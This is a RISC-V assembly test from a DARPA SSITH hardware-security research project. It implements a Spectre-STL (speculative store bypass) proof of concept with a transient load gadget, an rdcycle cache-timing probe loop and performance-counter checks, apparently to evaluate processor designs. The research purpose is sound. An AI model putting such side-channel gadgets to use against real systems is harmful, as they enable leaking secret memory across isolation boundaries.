/*-
 * SPDX-License-Identifier: BSD-2-Clause
 *
 * Copyright (c) 2021 Franz Fuchs
 * All rights reserved.
 *
 * This software was developed by SRI International and the University of
 * Cambridge Computer Laboratory (Department of Computer Science and
 * Technology) under DARPA contract HR0011-18-C-0016 ("ECATS"), as part of the
 * DARPA SSITH research programme.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include "../hpm_macros.h"

.text

/*
Spectre-STL

The store and the load go to the same address, but memory
disambiguation resolves them speculatively as non-dependent.
Therefore the load is issued before the store returns stale
data.

load to: 0x0000000080010400

*/

spec_stl:

    lla s0, mem_2
    lla s1, mem
#ifdef VCU_118
    li s2, 0xc0010000
#else
    li s2, 0x80010000
#endif
    li a0, 0x200
    li s5, 0x400
    sd s5, 0(s1)
    // prepare hardware performance monitoring
    // do counting of load request sent by the CPU
    HPM_SELECT_EVENT(3, 0x30)
    // read value of counter 3 and store it to t1
    HPM_M_READ_X (t1, 3)
    // do attack
    jal x1, store_funct
    // read value of counter 3 and store it to t2
    HPM_M_READ_X (t2, 3)


probe:

#ifdef VCU_118
  li t2, 0xc0010200
  li t6, 0xc0005000
#else
  li t2, 0x80010200
  li t6, 0x80005000
#endif

add t4, x0, x0
addi t5, x0, 16

probe_loop:
  rdcycle t0
  ld t3, 0(t2)
  rdcycle t1
  sub t1, t1, t0
  sd t1, 0(t6)
  addi t2, t2, 0x40
  addi t6, t6, 8
  addi t4, t4, 1
  blt t4, t5, probe_loop
  nop
  nop

    // if successful, we expect 5 loads to have happened
    // 3 architectural loads in store_funct
    // two transient loads for the latter two loads in
    // store_funct that have to be re-executed
    HPM_TEST(t1, t2, 5)

store_funct:

    ld s3, 0(s0)
    sd a0, 0(s3)
    // at this point the following holds:
    // s1 = s3
    ld a1, 0(s1)
    add s4, s2, a1
    ld s4, 0(s4)
    jalr x0, ra

.data

mem:
  .dword 0x0000000000000400
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000

mem_2:
#ifdef VCU_118
  .dword 0x00000000c0020000
#else
  .dword 0x0000000080020000
#endif
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000
  .dword 0x0000000000000000

.section .tohost , "adw"

tohost:
  .dword 0x0000000000000000
